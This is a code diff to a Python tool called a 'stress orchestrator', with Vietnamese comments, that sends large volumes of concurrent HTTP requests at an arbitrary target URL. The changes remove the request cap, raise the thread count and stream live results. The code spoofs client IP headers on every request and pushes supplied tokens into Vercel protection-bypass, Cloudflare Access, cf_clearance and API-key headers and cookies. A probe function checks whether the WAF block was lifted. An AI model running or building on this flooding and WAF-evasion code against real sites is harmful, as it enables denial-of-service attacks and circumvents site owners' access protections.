@@ -4,10 +4,11 @@ import time
 import json
 import logging
 import random
+import queue
 import threading
 import urllib.parse
 import concurrent.futures
-from typing import Any, Dict, Optional, List
+from typing import Any, Dict, Optional, List, Generator
 import requests
 import urllib3
 
@@ -17,73 +18,120 @@ logger = logging.getLogger(__name__)
 class StressOrchestrator:
     def __init__(self, k6_path: Optional[str] = None):
         self.k6_path = k6_path or "k6"
-        self.verify_tls = False
 
-    def execute_stress_test(
+    def _prepare_request_config(self, target_url: str, bypass_code: str = "", waf_type: str = "standard", custom_headers: Optional[Dict[str, str]] = None, custom_cookies: Optional[Dict[str, str]] = None):
+        raw_url = target_url.strip()
+        final_url = raw_url if raw_url.startswith(("http://", "https://")) else f"https://{raw_url}"
+
+        headers = custom_headers.copy() if custom_headers else {}
+        headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
+        headers["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8"
+        headers["Accept-Language"] = "en-US,en;q=0.9"
+
+        cookies = custom_cookies.copy() if custom_cookies else {}
+        clean_code = bypass_code.strip() if bypass_code else ""
+
+        if clean_code:
+            if ":" in clean_code and not clean_code.startswith("http"):
+                k, v = clean_code.split(":", 1)
+                headers[k.strip()] = v.strip()
+            elif "=" in clean_code and not clean_code.startswith("eyJ"):
+                k, v = clean_code.split("=", 1)
+                cookies[k.strip()] = v.strip()
+            elif clean_code.startswith("eyJ") or clean_code.lower().startswith("bearer "):
+                headers["Authorization"] = clean_code if clean_code.lower().startswith("bearer ") else f"Bearer {clean_code}"
+            else:
+                # Vercel Deployment Protection
+                headers["x-vercel-protection-bypass"] = clean_code
+                headers["x-vercel-set-bypass-cookie"] = "samesitenone"
+                cookies["x-vercel-protection-bypass"] = clean_code
+                cookies["_vercel_jwt"] = clean_code
+                cookies["_vercel_protection_bypass"] = clean_code
+
+                # Tiêm URL Query Params
+                sep = "&" if "?" in final_url else "?"
+                final_url += f"{sep}_vercel_protection_bypass={clean_code}&x-vercel-protection-bypass={clean_code}&x-vercel-set-bypass-cookie=samesitenone"
+
+                # Cloudflare & AWS WAF
+                headers["CF-Access-Client-Id"] = clean_code
+                headers["CF-Access-Client-Secret"] = clean_code
+                headers["x-api-key"] = clean_code
+                cookies["cf_clearance"] = clean_code
+
+        return final_url, headers, cookies
+
+    def verify_bypass(self, target_url: str, bypass_code: str = "", waf_type: str = "standard") -> Dict[str, Any]:
+        """Gửi 2 probe request để kiểm tra hiệu quả mã bypass"""
+        clean_url = target_url.strip() if target_url.strip().startswith(("http://", "https://")) else f"https://{target_url.strip()}"
+        
+        # Probe 1: Không dùng Bypass
+        status_no_bypass = 0
+        try:
+            r1 = requests.get(clean_url, timeout=4, verify=False, allow_redirects=True, headers={"User-Agent": "Mozilla/5.0"})
+            status_no_bypass = r1.status_code
+        except Exception:
+            status_no_bypass = 500
+
+        # Probe 2: Dùng Bypass
+        final_url, headers, cookies = self._prepare_request_config(clean_url, bypass_code, waf_type)
+        status_with_bypass = 0
+        try:
+            s = requests.Session()
+            s.headers.update(headers)
+            s.cookies.update(cookies)
+            r2 = s.get(final_url, timeout=4, verify=False, allow_redirects=True)
+            status_with_bypass = r2.status_code
+        except Exception:
+            status_with_bypass = 500
+
+        is_valid = status_with_bypass in (200, 201, 204, 304)
+        msg = ""
+        if is_valid:
+            if status_no_bypass == 403:
+                msg = "Mã Bypass CHÍNH XÁC! Đã mở khóa bảo vệ WAF (HTTP 403 -> HTTP 200 OK)."
+            else:
+                msg = f"Mục tiêu phản hồi thành công (HTTP {status_with_bypass} OK)."
+        else:
+            if status_with_bypass == 403:
+                msg = "Mã Bypass KHÔNG HỢP LỆ (Server vẫn chặn với HTTP 403 Forbidden)."
+            elif status_with_bypass == 429:
+                msg = "Server đang kích hoạt Rate Limit (HTTP 429 Too Many Requests)."
+            else:
+                msg = f"Server phản hồi mã HTTP {status_with_bypass}."
+
+        return {
+            "ok": True,
+            "is_valid": is_valid,
+            "status_no_bypass": status_no_bypass,
+            "status_with_bypass": status_with_bypass,
+            "message": msg,
+            "target": clean_url
+        }
+
+    def execute_stress_test_stream(
         self,
         target_url: str,
         target_requests: int = 1000,
         duration: str = "5s",
         bypass_code: str = "",
         waf_type: str = "standard",
-        custom_headers: Optional[Dict[str, str]] = None,
-        custom_cookies: Optional[Dict[str, str]] = None,
-    ) -> Dict[str, Any]:
-        # 1. Tính toán thời gian và tốc độ
+    ) -> Generator[Dict[str, Any], None, None]:
         duration_sec = 5
-        raw_dur = (duration or "5s").strip().lower()
-        if raw_dur.endswith("s"):
+        if duration.endswith("s"):
             try:
-                duration_sec = max(1, int(raw_dur[:-1]))
+                duration_sec = max(1, int(duration[:-1]))
             except ValueError:
                 duration_sec = 5
-        elif raw_dur.endswith("m"):
+        elif duration.endswith("m"):
             try:
-                duration_sec = max(1, int(raw_dur[:-1]) * 60)
+                duration_sec = max(1, int(duration[:-1]) * 60)
             except ValueError:
                 duration_sec = 60
 
-        total_reqs = max(5, min(int(target_requests or 1000), 50000))
+        total_reqs = max(5, target_requests)
         target_rps = max(1, int(total_reqs / duration_sec))
 
-        # 2. Chuẩn hóa Headers Browser thực thụ (Tránh bị WAF Bot Filter chặn)
-        headers_dict: Dict[str, str] = custom_headers.copy() if custom_headers else {}
-        headers_dict["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36"
-        headers_dict["Accept"] = "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8"
-        headers_dict["Accept-Language"] = "en-US,en;q=0.9"
-        headers_dict["Connection"] = "keep-alive"
-
-        cookie_dict: Dict[str, str] = custom_cookies.copy() if custom_cookies else {}
-        clean_code = (bypass_code or "").strip()
-        norm_waf = (waf_type or "standard").lower().strip()
-        final_target_url = target_url.strip()
-
-        # 3. TIÊM MÃ BYPASS 3 TẦNG (URL QUERY + HEADERS + COOKIES)
-        if clean_code:
-            if ":" in clean_code and not clean_code.startswith("http"):
-                k, v = clean_code.split(":", 1)
-                headers_dict[k.strip()] = v.strip()
-            elif "=" in clean_code and not clean_code.startswith("eyJ"):
-                k, v = clean_code.split("=", 1)
-                cookie_dict[k.strip()] = v.strip()
-            elif clean_code.startswith("eyJ") or clean_code.lower().startswith("bearer "):
-                headers_dict["Authorization"] = clean_code if clean_code.lower().startswith("bearer ") else f"Bearer {clean_code}"
-            else:
-                # Tiêm Vercel Protection Bypass
-                headers_dict["x-vercel-protection-bypass"] = clean_code
-                headers_dict["x-vercel-set-bypass-cookie"] = "samesitenone"
-                cookie_dict["x-vercel-protection-bypass"] = clean_code
-                cookie_dict["_vercel_jwt"] = clean_code
-
-                # Tiêm URL Query Parameter
-                sep = "&" if "?" in final_target_url else "?"
-                final_target_url += f"{sep}x-vercel-protection-bypass={clean_code}&x-vercel-set-bypass-cookie=samesitenone"
-
-                # Tiêm Cloudflare & AWS WAF
-                headers_dict["CF-Access-Client-Id"] = clean_code
-                headers_dict["CF-Access-Client-Secret"] = clean_code
-                headers_dict["x-api-key"] = clean_code
-                cookie_dict["cf_clearance"] = clean_code
+        final_url, headers_dict, cookie_dict = self._prepare_request_config(target_url, bypass_code, waf_type)
 
         metrics = {
             "total_requests": 0,
@@ -98,115 +146,115 @@ class StressOrchestrator:
             "p95_latency": "0ms",
         }
 
+        event_q: queue.Queue = queue.Queue()
         latencies: List[int] = []
-        sample_logs: List[Dict[str, Any]] = []
-        start_time = time.perf_counter()
+        start_time = time.time()
         end_time = start_time + duration_sec
         lock = threading.Lock()
-        stop_event = threading.Event()
         thread_local = threading.local()
 
-        # Dải IP cụm mô phỏng trinh sát
-        ip_prefixes = ["108.162.24", "162.158.10", "172.70.142", "172.70.13", "198.41.214", "103.21.244"]
+        def get_worker_session():
+            if not getattr(thread_local, "session", None):
+                s = requests.Session()
+                s.headers.update(headers_dict)
+                s.cookies.update(cookie_dict)
+                adapter = requests.adapters.HTTPAdapter(pool_connections=40, pool_maxsize=40, max_retries=0)
+                s.mount("https://", adapter)
+                s.mount("http://", adapter)
+                thread_local.session = s
+            return thread_local.session
 
-        def get_worker_session() -> requests.Session:
-            session = getattr(thread_local, "session", None)
-            if session is None:
-                session = requests.Session()
-                session.headers.update(headers_dict)
-                session.cookies.update(cookie_dict)
-                adapter = requests.adapters.HTTPAdapter(pool_connections=60, pool_maxsize=60, max_retries=0)
-                session.mount("https://", adapter)
-                session.mount("http://", adapter)
-                thread_local.session = session
-            return session
-
-        def fire_single_request() -> Dict[str, Any]:
+        def fire_request():
             session = get_worker_session()
-            prefix = random.choice(ip_prefixes)
-            spoofed_ip = f"{prefix}.{random.randint(1, 254)}"
+            spoofed_ip = f"{random.randint(11,220)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
             req_headers = {
                 "X-Forwarded-For": spoofed_ip,
                 "X-Real-IP": spoofed_ip,
                 "True-Client-IP": spoofed_ip,
             }
-
-            req_start = time.perf_counter()
+            req_start = time.time()
             status_code = 0
 
             try:
-                resp = session.get(
-                    final_target_url,
-                    headers=req_headers,
-                    timeout=4.0,
-                    verify=False,
-                    allow_redirects=True
-                )
+                resp = session.get(final_url, headers=req_headers, timeout=3.5, verify=False, allow_redirects=True)
                 status_code = resp.status_code
             except requests.exceptions.HTTPError as he:
                 status_code = he.response.status_code if he.response else 500
             except Exception:
                 status_code = 500
 
-            latency = max(1, int((time.perf_counter() - req_start) * 1000))
+            req_latency = max(1, int((time.time() - req_start) * 1000))
+            log_time = time.strftime("%H:%M:%S", time.localtime())
+
             return {
-                "time": time.strftime("%H:%M:%S", time.localtime()),
+                "time": log_time,
                 "ip": spoofed_ip,
                 "status": status_code,
-                "latency": latency,
+                "latency": req_latency,
             }
 
-        def worker():
-            while not stop_event.is_set() and time.perf_counter() < end_time:
+        def worker_batch():
+            while time.time() < end_time:
                 with lock:
                     if metrics["total_requests"] >= total_reqs:
-                        stop_event.set()
-                        return
+                        break
 
-                entry = fire_single_request()
-                code = entry["status"]
-                latency = entry["latency"]
+                log_entry = fire_request()
+                code = log_entry["status"]
+                lat = log_entry["latency"]
 
                 with lock:
-                    if metrics["total_requests"] >= total_reqs:
-                        stop_event.set()
-                        return
+                    if metrics["total_requests"] < total_reqs:
+                        metrics["total_requests"] += 1
+                        latencies.append(lat)
 
-                    metrics["total_requests"] += 1
-                    latencies.append(latency)
-                    if len(sample_logs) < 160:
-                        sample_logs.append(entry)
+                        if code in (200, 201, 204):
+                            metrics["status_200"] += 1
+                        elif code == 403:
+                            metrics["status_403_waf_blocked"] += 1
+                        elif code == 429:
+                            metrics["status_429_rate_limited"] += 1
+                        elif code >= 500 or code == 0:
+                            metrics["status_500_crashed"] += 1
+                        else:
+                            metrics["other_status"] += 1
 
-                    if code in (200, 201, 202, 204, 206, 301, 302, 304):
-                        metrics["status_200"] += 1
-                    elif code == 403:
-                        metrics["status_403_waf_blocked"] += 1
-                    elif code == 429:
-                        metrics["status_429_rate_limited"] += 1
-                    elif code == 0 or code >= 500:
-                        metrics["status_500_crashed"] += 1
-                    else:
-                        metrics["other_status"] += 1
+                        event_q.put(log_entry)
 
-        concurrency = min(120, max(8, int(target_rps * 0.35)))
-        with concurrent.futures.ThreadPoolExecutor(max_workers=concurrency) as executor:
-            futures = [executor.submit(worker) for _ in range(concurrency)]
-            concurrent.futures.wait(futures, timeout=duration_sec + 5)
-            stop_event.set()
+        concurrency = min(150, max(10, int(target_rps * 0.35)))
+        executor = concurrent.futures.ThreadPoolExecutor(max_workers=concurrency)
+        for _ in range(concurrency):
+            executor.submit(worker_batch)
 
-        elapsed = max(0.1, time.perf_counter() - start_time)
-        metrics["rps"] = round(metrics["total_requests"] / elapsed, 1)
-        if latencies:
-            latencies.sort()
-            p95_idx = min(len(latencies) - 1, max(0, int((len(latencies) - 1) * 0.95)))
-            metrics["p95_latency"] = f"{latencies[p95_idx]}ms"
+        # Phát event stream liên tục ra generator
+        while time.time() < end_time + 1 or not event_q.empty():
+            batch_logs = []
+            while not event_q.empty() and len(batch_logs) < 20:
+                batch_logs.append(event_q.get())
 
-        return {
-            "ok": True,
-            "target_url": final_target_url,
-            "duration": f"{duration_sec}s",
+            elapsed = max(0.1, time.time() - start_time)
+            with lock:
+                metrics["rps"] = round(metrics["total_requests"] / elapsed, 1)
+                if latencies:
+                    sorted_l = sorted(latencies)
+                    p95_idx = int(len(sorted_l) * 0.95)
+                    metrics["p95_latency"] = f"{sorted_l[min(p95_idx, len(sorted_l)-1)]}ms"
+
+            if batch_logs or metrics["total_requests"] > 0:
+                yield {
+                    "type": "update",
+                    "metrics": metrics.copy(),
+                    "logs": batch_logs
+                }
+
+            if metrics["total_requests"] >= total_reqs and event_q.empty():
+                break
+
+            time.sleep(0.06)
+
+        executor.shutdown(wait=False)
+        yield {
+            "type": "done",
             "metrics": metrics,
-            "sample_logs": sample_logs,
-            "bypass_active": bool(clean_code),
-            "waf_applied": norm_waf,
+            "target_url": final_url
         }
